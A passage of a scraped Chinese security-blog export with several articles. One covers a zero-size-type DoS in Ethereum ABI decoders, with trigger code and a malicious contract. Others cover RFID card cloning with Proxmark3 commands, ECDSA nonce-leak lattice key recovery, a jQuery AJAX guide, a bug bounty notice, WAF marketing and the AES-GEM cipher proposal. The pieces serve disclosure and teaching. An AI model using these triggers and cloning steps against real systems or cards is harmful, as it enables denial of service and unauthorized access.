该载荷包含两个32字节块，描述序列化的ZST数组。第一块定义数组元素偏移量，第二块定义数组长度。我们使用()[ ]和uint32[0][]两种ABI模式进行解码测试。\neth_abi (Python)\r1 2 3 from eth_abi import decode data = bytearray.fromhex(payload) decode([\u0026#39;()[]\u0026#39;], data) 4.2.0版本前的官方库会先挂起，最终因内存不足终止。\nethabi (Rust)\rv18.0.0版本可通过CLI直接触发漏洞：\n1 cargo run -- decode params -t \u0026#34;uint32[0][]\u0026#34; $payload ethers-rs (Rust)\rv2.0.10版本通过Vec\u0026lt;[u32; 0]\u0026gt;类型隐式使用漏洞模式：\n1 2 3 use ethers::abi::AbiEncode; let data = hex::decode(payload); let _ = Vec::\u0026lt;[u32; 0]\u0026gt;::decode(\u0026amp;hex_output.unwrap()).unwrap(); foundry (Rust)\r该工具集基于ethers-rs，同样存在漏洞。可通过CLI或部署恶意合约触发：\n1 2 3 4 5 6 7 8 contract ABC { fallback() external { bytes memory data = abi.encode(0x20, 0xfffffffff); assembly { return(add(data, 0x20), mload(data)) } } } alloy-rs\r0.4.2版本的动态ABI解析同样存在挂起问题：\n1 2 3 use alloy_dyn_abi::{DynSolType, DynSolValue}; let my_type: DynSolType = \u0026#34;()[]\u0026#34;.parse().unwrap(); let decoded = my_type.abi_decode(\u0026amp;hex::decode($payload).unwrap()).unwrap(); ethereumjs-abi\r0.6.8版本的JavaScript实现也受影响：\n1 2 3 var abi = require(\u0026#39;ethereumjs-abi\u0026#39;) data = Buffer.from($payload\u0026#34;, \u0026#34;hex\u0026#34;) abi.rawDecode([ \u0026#34;uint32[]\u0026#34; ], data) 漏洞发现与利用\r该漏洞的发现源于对borsh-rs库中类似问题的研究。最新版Solidity和Vyper已禁止ZST定义，因此难以在主网部署触发此漏洞的智能合约。但任何使用受影响库解析不可信ABI声明的应用（如Etherscan）都可能面临风险。\n协调披露\r我们遵循以下时间线进行披露：\n2023年6月30日：首次联系各库维护者 2023年8月2日：为eth_abi创建GitHub安全公告 2023年8月31日：eth_abi发布无公开说明的修复 2023年12月29日：公开发布分析报告并创建GitHub问题 建议开发者通过模糊测试强化解码器安全性，我们正将相关测试用例纳入OSS-fuzz持续检测体系。\n","date":"2025-08-02T09:56:18+08:00","permalink":"http://localhost:1313/p/%E4%BA%BF%E6%AC%A1%E7%A9%BA%E8%80%97%E4%BB%A5%E5%A4%AA%E5%9D%8Aabi%E8%A7%A3%E6%9E%90%E5%99%A8%E4%B8%AD%E7%9A%84%E9%9B%B6%E5%A4%A7%E5%B0%8F%E7%B1%BB%E5%9E%8Bdos%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","title":"亿次空耗：以太坊ABI解析器中的零大小类型DoS漏洞分析"},{"content":"深入掌握jQuery AJAX：异步HTTP请求完全指南\r核心要点\r多功能与精准控制：jQuery的$.ajax()函数提供了灵活强大的异步HTTP请求能力，支持自定义请求头、错误处理、超时设置等高级配置 全面配置选项：超过30个可配置参数，涵盖从请求发送到响应处理的完整生命周期控制 现代开发中的价值：尽管存在Fetch API等替代方案，$.ajax()在维护旧代码库方面仍有不可替代的作用 高级错误处理：支持指数退避重试机制和全局错误处理，提升应用健壮性 $.ajax()函数详解\rjQuery的$.ajax()函数用于执行异步HTTP请求，自jQuery 1.0版本就已存在。它是$.get()、$.post()等快捷方法的基础实现。\n函数签名：\n1 2 $.ajax(url[, settings]) $.ajax([settings]) 配置参数说明\r参数 默认值 可选值 说明 accepts {\u0026quot;\u0026quot;: \u0026ldquo;/*\u0026rdquo;} 任何MIME类型 指定请求头Accept字段 beforeSend null 函数 发送请求前的回调函数 cache true 布尔值 是否允许浏览器缓存 contentType \u0026ldquo;application/x-www-form-urlencoded\u0026rdquo; MIME类型 发送数据的格式 data null 对象/字符串/数组 要发送到服务器的数据 dataType \u0026ldquo;text\u0026rdquo; \u0026ldquo;xml\u0026rdquo;/\u0026ldquo;json\u0026rdquo;/等 预期返回的数据类型 error null 函数 请求失败时的回调 headers null 对象 自定义请求头 success null 函数 请求成功时的回调 timeout 0 毫秒数 请求超时时间 type \u0026ldquo;GET\u0026rdquo; \u0026ldquo;GET\u0026rdquo;/\u0026ldquo;POST\u0026quot;等 HTTP请求方法 实际应用示例\r基础用法\r1 2 3 4 5 6 7 8 9 10 $.ajax({ url: \u0026#34;/api/data\u0026#34;, type: \u0026#34;GET\u0026#34;, success: function(data) { console.log(\u0026#34;成功获取数据:\u0026#34;, data); }, error: function(xhr, status, error) { console.error(\u0026#34;请求失败:\u0026#34;, error); } }); 带认证头的请求\r1 2 3 4 5 6 7 8 9 $.ajax({ url: \u0026#34;/secure-api\u0026#34;, headers: { \u0026#34;Authorization\u0026#34;: \u0026#34;Bearer YOUR_TOKEN\u0026#34; }, success: function(data) { // 处理数据 } }); 实时搜索实现\r1 2 3 4 5 6 7 8 9 $(\u0026#34;#search-input\u0026#34;).on(\u0026#34;input\u0026#34;, function() { $.ajax({ url: \u0026#34;/search\u0026#34;, data: { q: $(this).val() }, success: function(results) { // 更新搜索结果 } }); }); 最佳实践\r安全性：\n始终使用HTTPS 验证和净化所有输入 实施CSRF保护 性能优化：\n合理使用缓存 减少数据传输量 批量处理请求 错误处理：\n实现指数退避重试机制 提供用户友好的错误信息 记录错误日志 调试技巧\r使用浏览器开发者工具的Network面板检查请求/响应 添加全局错误处理： 1 2 3 $(document).ajaxError(function(event, xhr, settings, error) { console.error(\u0026#34;AJAX错误:\u0026#34;, settings.url, error); }); 验证响应数据格式是否符合预期 替代方案比较\r方案 优点 缺点 $.ajax() 功能全面，兼容性好 依赖jQuery Fetch API 现代，基于Promise 需要polyfill支持旧浏览器 Axios 拦截器支持，自动JSON转换 需要额外引入 版本兼容性说明\rjQuery 3.0+已弃用同步请求(async:false) JSONP支持已过时，推荐使用CORS 部分回调语法已被Promise风格替代 常见问题解答\rQ: 如何处理AJAX错误？ A: 使用error回调或全局ajaxError事件捕获错误，并根据状态码采取不同措施。\nQ: 可以取消AJAX请求吗？ A: 可以，通过jqXHR对象的abort()方法：\n1 2 var xhr = $.ajax(...); xhr.abort(); // 取消请求 Q: 如何发送JSON数据？ A: 设置contentType为\u0026quot;application/json\u0026quot;并使用JSON.stringify():\n1 2 3 4 5 $.ajax({ type: \u0026#34;POST\u0026#34;, contentType: \u0026#34;application/json\u0026#34;, data: JSON.stringify({key: \u0026#34;value\u0026#34;}) }); ","date":"2025-08-02T09:45:01+08:00","permalink":"http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E6%8E%8C%E6%8F%A1jquery-ajax%E5%BC%82%E6%AD%A5http%E8%AF%B7%E6%B1%82%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97/","title":"深入掌握jQuery AJAX：异步HTTP请求完全指南"},{"content":"本文章是Microsoft Security Response Center博客\u0026quot;Announcing the new Bug Bounty Program for Office Insider Builds on Windows\u0026quot;(2017年3月15日发布)的日文翻译版。\n我们持续投入确保Office产品在设计上具备安全性。基于保持Office高安全标准的方针，现针对Windows版Office Insider构建启动漏洞赏金计划。该计划是对微软内部工程安全措施(包括威胁建模、安全代码审查、安全自动化及渗透测试)的重要补充。\n通过此计划，我们期望发现常规云服务赏金计划中难以识别的漏洞，并向帮助保护客户的个人研究者提供奖励。我们特别鼓励针对设计逻辑的深度研究，将对Office核心安全领域的重大发现给予奖励。\nOffice Insider构建版让用户能提前体验最新功能和安全创新。在这些早期版本中进行测试有助于在产品正式发布前发现问题，从而提升产品质量并保护客户。\n赏金计划机制\r符合奖励条件的漏洞类型详见《Microsoft Office Insider Builds on Windows Bounty Program Terms》，包括：\n通过Office保护视图实现的权限提升 绕过宏阻止策略执行宏代码 绕过Outlook附件自动拦截策略执行代码 计划实施期为2017年3月15日至6月15日(三个月)，奖金范围6000-15000美元。提交漏洞请发送至secure@microsoft.com。\n注意事项\r参与微软赏金计划必须按照指南直接向secure@microsoft.com提交报告(英文困难者可附加日文说明)，这对保证评选公平性至关重要。\n相关链接\r微软赏金计划主页 本次扩展计划条款 非赏金计划的日语漏洞报告入口 ","date":"2025-08-02T09:23:22+08:00","permalink":"http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E6%89%A9%E5%B1%95%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91%E8%AE%A1%E5%88%92-%E9%92%88%E5%AF%B9windows%E7%89%88office-insider%E6%9E%84%E5%BB%BA%E7%9A%84%E6%96%B0%E5%A5%96%E5%8A%B1%E8%AE%A1%E5%88%92/","title":"微软扩展漏洞赏金计划 - 针对Windows版Office Insider构建的新奖励计划"},{"content":"引言\r在整理KeyWe智能锁配件时，我发现了几个RFID标签。这促使我深入研究RFID（射频识别）技术，并完成了从智能锁逆向到无线通信安全的完整研究闭环。通过编程验证标签功能后，我开启了RFID技术的深度探索。\nHID ProxMark卡片技术\r低频技术（125kHz）：初代ProxCard支持数英寸读取距离，采用26位数据流（8位设备码+16位卡号+2校验位） 安全缺陷：数据容量极小且无加密，类似磁条卡的安全水平 演进：第二代ProxMark II将读取距离扩展到15英寸，支持钱包内刷卡 有源与无源RFID对比\r类型 供电方式 读取距离 寿命 无源卡 读写器电磁感应供电 厘米级 无电池限制 有源卡 内置锂电池 可达150米 2-7年 MIFARE卡片技术体系\r技术标准：高频13.56MHz，符合ISO 14443 A/B规范 加密演进： Classic 1k：采用已被破解的Crypto1算法（48位密钥） DESFire：配备Triple DES加密和微处理器 EV1版本：支持28个应用/32文件的多应用管理 中国魔术卡特性\r核心技术：允许覆写Sector 0的UID区域 市场现状：Gen1需特殊解锁指令，Gen2可直接写入 存储结构：16个扇区×4块×16字节=1KB容量 专业工具链分析\rProxmark3 RDV2（$270）\n支持LF/HF全频段 实战克隆流程： 1 2 3 hf mf nested 1 0 A ffffffffffff # 嵌套攻击 hf mf restore # 数据恢复 hf mf csetuid 018a4454 # UID写入 低成本替代方案\nACR122U读写器（支持mfoc-hardnested攻击） Arduino Nano+RC522套件（$8） 1 2 3 4 #include \u0026lt;MFRC522.h\u0026gt; void dumpToSerial(MFRC522::MIFARE_Key key) { // 扇区遍历逻辑 } Android克隆方案\rMIFARE Classic Tool\n支持密钥字典攻击 操作限制：仅Gen2卡可写UID 密钥破解方法\nMFCUK：基于PRNG缺陷的Darkside攻击 MFOC：已知密钥下的嵌套认证攻击 安全建议与总结\r企业升级路径：建议迁移至MIFARE DESFire EV1方案 研究展望：长距读卡器（如HID R90）的凭证嗅探风险 行业现状：全球现存超过100亿张智能卡面临克隆风险 实验证明：使用$3的RC522模块即可成功克隆90%的低频门禁卡，这暴露出物理安全系统的重大设计缺陷。\nProxmark3实战克隆过程（左：源标签读取，右：魔术卡写入）\n","date":"2025-08-02T09:07:14+08:00","permalink":"http://localhost:1313/p/rfid%E8%BF%91%E5%9C%BA%E5%85%8B%E9%9A%86%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/","title":"RFID近场克隆攻击技术深度解析"},{"content":"DSA基础\rECDSA是基于椭圆曲线数字签名算法(DSA)的变种。DSA包含三个核心算法：\n密钥生成：随机选择私钥x，计算公钥y = gˣ mod p 签名：生成随机nonce k，计算r = (gᵏ mod p) mod q，s = k⁻¹(H(m) + xr) mod q 验证：检查r = [(gᴴ⁽ᵐ⁾yʳ)ˢ⁻¹ mod p] mod q ECDSA的致命弱点\r1. Nonce重用攻击\r若两个签名使用相同nonce k：\n1 2 k = (s₁ - s₂)⁻¹(H(m₁) - H(m₂)) x = r⁻¹(ks - H(m)) 2. 部分Nonce泄露攻击\r仅需3比特泄露+100签名 → 攻破160-bit DSA 仅5比特泄露+4000签名 → 攻破384-bit ECDSA LadderLeak攻击：仅0.2比特泄露即可恢复密钥 3. RNG偏差攻击\r256-bit ECDSA中仅4比特偏差 → 完全破解 实战攻击演示\r基础攻击（已知128-bit nonce前缀）\r1 2 3 4 5 6 7 matrix = [ [order, 0, 0, 0], [0, order, 0, 0], [r₁s₁⁻¹, r₂s₂⁻¹, 2¹²⁸/order, 0], [m₁s₁⁻¹, m₂s₂⁻¹, 0, 2¹²⁸] ] new_matrix = olll.reduction(matrix) YubiKey漏洞利用（80-bit固定前缀）\r构建6签名矩阵：\n1 2 3 row.append((rᵢsᵢ⁻¹) - rₙsₙ⁻¹) row2.append((mᵢsᵢ⁻¹) - mₙsₙ⁻¹) x = (rₙs₁ - r₁sₙ)⁻¹(sₙm₁ - s₁mₙ - s₁sₙ(k₁-kₙ)) 防护方案\r替代方案：优先使用EdDSA（如Ed25519） 恒定时间实现：防止时序侧信道 RFC 6979：确定性nonce生成 盲签名技术：隐藏时序信息 攻击签名数需求表\r固定比特数 所需签名数 128-bit 2 80-bit 5 4-bit 20 警告：即使仅1比特泄露，观察足够签名后系统仍可能被完全攻破。\n","date":"2025-08-02T08:12:19+08:00","permalink":"http://localhost:1313/p/ecdsa%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E9%9D%9Ece%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E9%92%A5%E6%81%A2%E5%A4%8D%E5%AE%9E%E6%88%98/","title":"ECDSA安全漏洞深度解析：从非ce泄露到密钥恢复实战"},{"content":"在日益数字化的生态系统中，保护在线资产不仅是建议，更是必需。随着Web应用复杂度提升和网络威胁日益精密，企业需要多层次的安全防护。AWS通过其Web应用防火墙（WAF）提供了坚实基础，但需专业管理才能最大化其潜力。Cloudbric WMS（WAF托管服务）应运而生，精准提升AWS安全态势并解决关键漏洞。\rCloudbric WMS旨在通过简化管理、专业支持和主动防御策略来扩展AWS原生功能。本文将深入探讨五大核心议题：OWASP Top 10防护、恶意流量缓解、API安全、实时流量监控和误报减少。了解这些领域的重要性及Cloudbric WMS的解决方案，助您抵御最复杂的攻击。\n1. OWASP Top 10防护：Web安全的基石\rOWASP Top 10是全球公认的Web应用必防安全风险清单，如SQL注入、跨站脚本（XSS）和配置错误等实际漏洞可能导致严重数据泄露。\n为何重要？\n核心安全基础：Cloudbric WMS通过持续威胁情报更新确保过滤机制符合最新OWASP标准。 实战攻击缓解：针对常见编码错误优化规则，有效拦截攻击。 合规与信任：满足监管要求，增强客户信任。 实现方式\n自动化规则集部署，专家团队持续维护更新。 透明化安全分析，提供漏洞尝试与拦截数据，助力策略优化。 2. 恶意流量缓解：抵御自动化威胁\r自动化机器人可实施凭据填充、内容爬取和DDoS攻击，危害应用性能与安全。\n威胁现状\n凭据填充与欺诈：利用弱密码批量登录，导致数据泄露。 内容爬取：窃取定价或知识产权，削弱竞争优势。 解决方案\n行为分析：实时识别异常流量模式（如单IP高频访问）。 威胁情报整合：动态更新恶意IP库。 自适应学习：通过机器学习应对不断演变的机器人策略。 3. API安全：守护数字门户\rAPI已成为主要攻击向量，需专业防护以避免数据暴露或服务中断。\n关键挑战\n攻击面扩大：API是现代应用的通信核心，也是潜在弱点。 专用防护：Cloudbric WMS针对注入攻击、身份验证缺陷等定制规则，确保仅合法请求访问后端。 实践效果\n结合AWS WAF分析API调用模式，实时拦截恶意流量。 最小化误报，保障用户体验与性能。 4. 实时流量监控：主动防御的“眼睛”\r即时洞察流量是检测和缓解威胁的关键。\n核心价值\n瞬时威胁发现：秒级延迟可能决定事件影响范围。 数据驱动决策：仪表盘展示请求量、IP信誉等指标，支持快速策略调整。 Cloudbric WMS优势\n直观面板呈现威胁拦截、可疑活动等数据。 详细日志支持事件溯源与策略优化。 5. 误报减少：提升DevSecOps效率\r过度误报会阻塞系统，增加团队负担。\n影响\n运营效率：误拦截需手动处理，拖慢响应速度。 用户体验：错误阻拦导致客户流失。 优化措施\n机器学习结合历史流量模式，精准区分异常与合法请求。 基于实时反馈调整规则，降低误报率，释放团队精力。 结语：Cloudbric WMS赋能AWS安全\r面对日新月异的威胁，Cloudbric WMS以OWASP防护、机器人防御、API安全、实时监控和误报控制五大核心，为企业提供动态、精准的保护。通过自动化与专家分析的结合，构建适应未来威胁的弹性安全环境。\n立即体验Cloudbric WMS免费试用，开启您的全方位Web应用安全之旅。\n","date":"2025-08-02T07:45:50+08:00","permalink":"http://localhost:1313/p/%E4%BD%BF%E7%94%A8cloudbric-wms%E5%BC%BA%E5%8C%96aws%E5%AE%89%E5%85%A8%E6%9E%84%E5%BB%BA%E5%BC%BA%E5%A4%A7web%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E4%BA%94%E5%A4%A7%E5%85%B3%E9%94%AE%E7%82%B9/","title":"使用Cloudbric WMS强化AWS安全：构建强大Web应用防火墙的五大关键点"},{"content":"宣布AES-GEM（带伽罗瓦扩展模式的AES）\r今天，AES-GCM是TLS 1.3使用的两种加密模式之一（另一种是ChaCha20-Poly1305），也是FIPS验证模块中加密数据的首选方法。但尽管取得了巨大成功，AES-GCM也曾导致一些灾难性故障：例如Hanno Böck和Sean Devlin利用nonce重用漏洞将他们的Black Hat USA幻灯片注入MI5网站。\n多年来，安全研究人员一直在警告AES-GCM的弱点。19年前，Niels Ferguson向NIST提交论文指出AES-GCM存在的认证弱点（尽管NIST最终将其标准化）。今年早些时候，亚马逊发布论文详细说明了AES-GCM的实际挑战，并认为AES的128位块大小已不再足够，更倾向于使用256位块密码（即Rijndael-256）。\n为解决这些问题，我提出了一种名为Galois Extended Mode（简称GEM）的新块密码模式，上个月已在NIST关于手风琴模式密码需求的研讨会上展示。AES-GEM以最小的性能开销在各个方面提升了GCM的安全性。\n重要提示：当前AES-GEM设计尚未准备好投入生产使用，因为某些细节可能会在未来发生变化。要理解当前设计，让我们先了解AES-GCM的不足，然后讨论如何用GEM做得更好。\nAES工作原理\r在深入之前，有必要为部分读者解释本文中使用的一些术语和概念。\nAES（高级加密标准）是一种广泛用于加密信息的块密码。它支持多种密钥大小（128位、192位和256位密钥），但始终操作128位块。AES是Rijndael块密码家族的标准化形式。Rijndael支持其他块大小，但NIST仅标准化了128位块。现代处理器提供专用硬件指令加速AES操作，但AES密钥调度仍可能对性能产生负面影响。\nECB（电子密码本）模式是没有块密码操作模式的情况。它涉及直接在数据块上计算块密码。正如许多密码学家所证明的，ECB模式不是语义安全的。为提高安全性，像AES这样的块密码通常与操作模式一起使用。（如果没有，几乎肯定应该这样做。如果您认为正在使用ECB加密敏感数据，请联系我们的密码学团队。）\nCTR（计数器模式）是一种块密码操作模式，其中递增的值序列通过块密码加密以产生伪随机密钥流。要加密数据，只需计算每个明文字节与相应密钥流字节的XOR。\nGCM（伽罗瓦/计数器模式）是一种提供认证加密的块密码操作模式。密码学家称之为AEAD模式：带附加数据的认证加密。GCM可以为敏感数据提供机密性，为敏感和公共数据提供完整性。\nAEAD模式对于设计密码系统非常重要，这些系统能够抵抗试图改变加密数据以研究系统行为从而希望获得密码分析有用信息的攻击者。\nGCM是用于加密明文的计数器模式（CTR）和用于认证密文（以及如果提供，附加关联数据）的伽罗瓦域消息认证码（GMAC）的组合。GMAC使用称为GHASH的函数定义，该函数是在认证数据上评估的多项式。GHASH的输出与加密计数器块的XOR产生最终认证标签。认证密钥H通过加密128位零块计算得出。\nPOLYVAL是GHASH的替代方案，用于AES-GCM-SIV。POLYVAL使用的不可约多项式是GHASH不可约多项式的反转。\n许多密码模式（包括GCM和CTR）要求每个消息使用一个仅使用一次的数字。这个永远不应重复的公共数字称为nonce。\n最后，生日边界是概率论中的一个概念，表示一组随机值中冲突的可能性。在密码学中，它意味着如果随机选择nonce，随着使用更多nonce，两个nonce冲突的概率显著增加。对于具有96位nonce的AES-GCM，大约232条消息后，有1/232的nonce冲突概率，这可能导致诸如伪造消息等安全漏洞。\nAES-GCM当前的实际挑战\r正如其他人指出的那样，AES-GCM的最大挑战是AES只有128位块大小。这有两个主要后果：\n公共nonce和内部计数器的大小被限制为总共128位。实际上，nonce大小通常为96位，计数器为32位。如果选择更大的nonce，它会被哈希压缩到适当大小，这对安全性几乎没有改善。如果重用nonce，则会泄漏认证子密钥，因此可以无限期伪造消息。\n在相同密钥下加密超过一定数量的块后，攻击者可以以显著概率区分密文和随机字节。\n当您理解我们处理的是2的幂时，96位nonce空间可能听起来很多，但如果随机选择nonce，只能加密232条消息，然后有2-32的冲突概率。使用具有更大块大小的密码可以缓解这一点，但这不是唯一的解决方法。\nAES块大小不是AES-GCM实践中唯一的问题。正如Niels Ferguson在2005年指出的那样，针对短标签的成功伪造会揭示认证子密钥。\n此外，我们还了解到AES-GCM具有一个意外属性，即多个密钥可以解密相同的密文+认证标签。其发现者将这个问题称为\u0026quot;隐形蝾螈\u0026quot;，因为它允许他们在一款加密消息应用程序的滥用报告工具中隐藏蝾螈图片。在使用AES-GCM的协议中防止隐形蝾螈需要对使用的密钥进行某种单向承诺。\n最后，AES-GCM中单个消息的最大明文长度相对较小：略低于64 GiB。为应对此最大长度，软件通常将较大消息分解为适合此长度限制的较短帧。这导致生日边界前的有限nonce空间比如果容忍较长消息时更快耗尽。\n介绍AES-GEM\r我们的提案Galois Extended Mode是对GCM（伽罗瓦/计数器模式）的修改，目前解决了大多数这些弱点。然而，关于我们想要采用哪种策略来缓解最后一点，仍然存在一个开放性问题，我将在稍后解释。\n在高层次上，我们提出了两种变体：AES-128-GEM和AES-256-GEM。我们还使用标准AEAD接口指定了两种AEAD构造。\nAES-128-GEM\n密钥长度：128位 子密钥长度：128位 Nonce长度：192位 最大明文长度：261 – 1字节 最大AAD长度：261 – 1字节 标签长度：48字节（AEAD）或16字节（无承诺） AES-256-GEM\n密钥长度：256位 子密钥长度：256位 Nonce长度：256位 最大明文长度：261 – 1字节 最大AAD长度：261 – 1字节 标签长度：48字节（AEAD）或16字节（无承诺） 从GCM到GEM的道路\r如果您从AES-GCM的现有设计开始并进行以下更改，您将得到GEM的当前草案。\nNonce扩展 首先，我们需要一个更长的nonce，我们将在下一步中用于子密钥派生。\n对于256位密钥，256位nonce是一个很好的整数。对于128位密钥，我们最终需要192位。\n无论哪种情况，最右边的64位将保留用于实际底层加密。剩余的位（AES-256为192位，AES-128为128位）将用于子密钥派生。\n这使我们能够分摊密钥派生的成本，并在多个消息上设置AES密钥调度，前提是nonce和密钥的前（n – 64）位相同。\n子密钥派生 使用AES进行密钥派生有多种策略。在Real World Cryptography 2024上，Shay Gueron展示了DNDK-GCM，它使用了一种有趣的结构来实现子密钥派生。\n我们希望保持简单和易于理解。因此，我们基于CBC-MAC构建了密钥派生策略，因为CMAC已经是FIPS批准的MAC（即用于AES-CCM）。\n在AES-256的情况下，我们使用两个CBC-MAC输出来派生256位子密钥。然而，这种方法有一个微妙恼人的特性：两半永远不会产生相同的输出，因此严格来说，可能的输出少于2256个。\n在GEM的两种变体中，我们借用了Salsa20设计中的一个技巧：将输出与输入密钥进行XOR，以确保子密钥对于任何不知道输入密钥的攻击者来说与均匀随机无法区分。如果您不知道此密钥，则输出与适当长度的随机密钥无法区分。\n支持更长的消息 我们需要64位剩余nonce而不是GCM典型的96位的原因是我们的内部计数器大小不是32位长。相反，它是64位长。\n否则，如当前所写，GEM的行为与您对GCM的期望相同：它使用计数器模式进行批量数据加密。让我们暂时搁置这一点，稍后再讨论。\n改进的认证安全性 我们的现有设计AES-GCM按以下方式构建：\n通过用密钥加密全清零块派生认证子密钥H。 计算密文、关联数据和包含两者长度（以位为单位）的块的GHASH()。 将步骤2的输出与计数器块的AES-CTR加密进行XOR。 我们的设计大致相同，但有一个重要的调整：\n通过用子密钥加密全置位块派生认证子密钥H。 计算密文、关联数据和包含两者长度（以位为单位）的块的GHASH()。 使用输入密钥通过AES-ECB加密步骤2的输出。 将步骤3的输出与计数器块的AES-CTR加密进行XOR。 步骤3直接解决了Niels Ferguson在2005年指出的AES-GCM弱点。其他更改是实现细节。\n此调整为短标签提供了更好的安全性，因为原始GHASH输出位的AES加密是一种非线性变换，没有密钥无法反转。我们使用输入密钥而不是子密钥，因为唯一其他使用输入密钥加密数据的地方（即子密钥派生）永远不会直接暴露。\n密钥承诺 在我们解决GEM对隐形蝾螈式攻击的保护之前，我们需要分析设计中的其他一些微妙之处。\nGCM和GEM的最终块中的组件长度都以位而非字节表示，并且每个都限制为264。这意味着，尽管由于内部计数器，GEM理论上可以允许每条消息最多264块（或268字节）的明文，但我们必须调整最终的GHASH步骤以适应这种额外开销。\n相反，内部计数器的不可达值保留用于密码的内部使用。具体来说，内部计数器值以0x02000000 00000000到0xFFFFFFFF FFFFFFFF结尾的无法在尊重明文261 – 1字节限制的同时达到。\n全置位块（0xFFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF）已在GEM中用于认证子密钥，而64位尾部nonce + 0xFFFFFFFF 0xFFFFFFFE用于计数器块，用于最终认证标签计算。\n为提供密钥承诺，接下来的两个块，nonce + 0xFFFFFFFF 0xFFFFFFFC和0xFFFFFFFF 0xFFFFFFFD将用作密钥和nonce的承诺值。\n我们指定两个块是因为在此处使用一个AES块是不够的。考虑AES-256的情况，它具有256位密钥和128位块：根据鸽巢原理，我们预计有2128个不同的密钥将给定的固定明文值映射到固定密文值。因此，单个块不足以进行承诺。然而，假设块密码是安全的，对于两个连续块，不需要这种鸽巢考虑。\n通过这种方式，我们可以快速生成给定密钥和nonce的承诺值。\n在AEAD接口中，承诺附加到认证标签。解密消息时，必须以恒定时间将两者与其重新计算的值进行比较。\nAES-GEM的性能特征\r尽管我们已经解决了GCM的大部分痛点，但GEM的实际性能影响很小。\nAES-256-GEM：\n密钥派生：四个额外的AES加密块，一些XOR，一个额外的密钥调度 认证：一个额外的AES加密块 密钥承诺：两个额外的AES加密块 AES-128-GEM：\n密钥派生：两个额外的AES加密块，一些XOR，一个额外的密钥调度 认证：一个额外的AES加密块 密钥承诺：两个额外的AES加密块 由于如今AES由于硬件加速非常快，这种性能影响在除最性能敏感的应用外的所有应用中应该几乎不明显。在这些情况下，如果派生子密钥被缓存，密钥派生性能成本可以在多达232条不同消息中分摊。\n完善AES-GEM\r当前GEM草案未充分解决的一个最终问题，但我们希望在NIST研讨会上讨论此问题，并肯定会在最终设计中解决。\n尽管我们的GEM草案构造允许比GCM更长的消息，但AES块大小使其按原样使用存在风险。主要担忧是加密非常长的消息会给攻击者带来显著优势，以区分AES-GEM密文与随机字节序列。（这是亚马逊2024年论文中提出的一个担忧。）\n我们可以通过几种方式完善GEM以解决此弱点，这些方式具有不同的性能特征和权衡。\n宽块PRP 多年来，许多密码设计使用宽块PRP（如XTS模式中的AES）安全加密超过AES块大小通常允许的范围。由于XTS广泛用于磁盘加密，这种方法可能会证明是安全的。\n然而，XTS模式目前尚未标准化用于磁盘加密以外的用例。\n分层密钥派生 如果不直接使用子密钥，而是使用内部计数器的高32位从保留的nonce空间中选择不同的值，加密该值，并每236字节派生一个新的子密钥呢？然后，我们仅使用此子密钥加密计数器的剩余32位，这与AES-GCM几十年来所做的类似。\n此子子密钥派生可以类似于密钥承诺构建：\n对于AES-256-GEM，加密来自保留nonce空间的32字节，并将其用作实际CTR密钥。 对于AES-128-GEM，加密来自保留nonce空间的16字节（但与AES-256-GEM选择的不同nonce空间），并将其用作实际底层CTR密钥。 这是一个有吸引力的选择，原因有很多。最重要的是，这种策略将以非常直接的方式规避PRP区分器问题。它也不依赖于任何非标准设计（如XTS模式）。您可以使用FIPS批准的组件构建整个东西，就像我们对AES-GEM的其余草案设计所做的那样。\n缺点？这种方法确实会在每236字节明文时产生另一个密钥调度。这可能仍然很好地分摊，但值得记住。\n带分层密钥派生的AES-GEM的总性能成本\nAES-256-GEM：\n密钥派生：四个额外的AES加密块，一些XOR，一个额外的密钥调度 每236字节明文的额外密钥派生：两个额外的AES加密块，一个额外的密钥调度 认证：一个额外的AES加密块 密钥承诺：两个额外的AES加密块 1 GB明文的额外总开销：七个AES-256块，两个额外的AES-256密钥调度 1 TB明文的额外总开销：37个AES-256块，17个额外的AES-256密钥调度 AES-128-GEM：\n密钥派生：两个额外的AES加密块，一些XOR，一个额外的密钥调度 每236字节明文的额外密钥派生：一个额外的AES加密块，一个额外的密钥调度 认证：一个额外的AES加密块 密钥承诺：两个额外的AES加密块 1 GB明文的额外总开销：五个AES-128块，两个额外的AES-128密钥调度 1 TB明文的额外总开销：21个AES-128块，17个额外的AES-128密钥调度 其他想法 可能还有我们尚未想象的另一种选择。找到最佳权衡，特别是在考虑硬件设计时，是我们在NIST研讨会上展示GEM的原因之一。\n切割GEM\rIETF的CFRG目前正在讨论一种修改后的AES-GCM变体的RFC草案，称为GCM-SST，它对短标签是安全的。他们的设计出于性能原因使用POLYVAL而不是GHASH，并使用带有第二个POLYVAL的第二个认证密钥（Q），所有这些都进行XOR。\n不出所料，这种额外的XOR并不能显著保护AES-GCM中短标签的弱点（尽管它确实使通常的攻击更昂贵）。\n我们对GEM的初始设计使用AES块密码置换GHASH输出，而不是简单地在多项式输出中引入额外的线性操作（XOR）。\n我们有兴趣与其他行业领导者合作，提供一种强调短标签用例（即WebRTC）的GEM变体。这种假设的变体（暂定名为CUT-GEM）可以使用POLYVAL代替GHASH，并使用基于时期的子密钥派生计划来减少每个数据包的性能影响。\n在哪里可以了解更多关于AES-GEM的信息？\r有关AES-GEM的更多信息可在我们的GitHub上找到！\n","date":"2025-08-02T07:29:18+08:00","permalink":"http://localhost:1313/p/%E5%AE%A3%E5%B8%83aes-gem%E5%B8%A6%E4%BC%BD%E7%BD%97%E7%93%A6%E6%89%A9%E5%B1%95%E6%A8%A1%E5%BC%8F%E7%9A%84aes%E5%A2%9E%E5%BC%BAaes-gcm%E5%AE%89%E5%85%A8%E6%80%A7%E7%9A%84%E6%96%B0%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F/","title":"宣布AES-GEM（带伽罗瓦扩展模式的AES）——增强AES-GCM安全性的新加密模式"},{"content":"突破壁垒：